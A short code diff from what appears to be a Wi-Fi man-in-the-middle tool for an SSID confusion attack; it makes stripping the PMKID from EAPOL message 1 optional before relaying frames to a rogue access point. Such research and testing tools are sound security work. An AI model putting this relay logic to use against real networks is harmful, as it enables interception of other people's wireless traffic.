@@ -63,7 +63,9 @@ FrameProcess SsidConfusion::handle_eapol_real(
 		if(msg == 2 || msg == 4) return STOP; //block cycles
 		if(msg == 1) {
 			frame_raw_t stripped = raw;
-			strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
+			if(strip_pmkid_in_assoc) {
+				strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
+			}
 			display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
 			send_to_rogue(stripped);
 			return STOP;
